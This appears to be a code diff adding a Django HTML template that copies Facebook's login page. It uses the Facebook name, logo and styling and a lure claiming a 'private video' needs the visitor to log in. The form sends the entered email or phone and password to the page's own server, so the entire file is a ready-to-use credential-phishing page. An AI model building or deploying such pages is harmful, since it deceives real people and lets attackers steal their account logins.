@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            padding: 0 20px;
+        }
+
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            padding: 40px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .facebook-logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        .input-text {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            font-size: 16px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .video-heading {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        @media (max-width: 480px) {
+            .login-box {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h1 class="video-heading">This is a private video. Connect your Facebook account to view it.</h1>
+            <img class="facebook-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1280px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo">
+            <h2>Login to Facebook</h2>
+            <form method="POST" action="">
+                            {% csrf_token %}
+                <input type="text" class="input-text" placeholder="Email or Phone" name="username" required>
+                <br>
+                <input type="password" class="input-text" placeholder="Password" name="password" required>
+                <br>
+                <input type="submit" class="btn-login" value="Log In">
+                <br>
+                <a class="forgot-password" href="#">Forgot password?</a>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
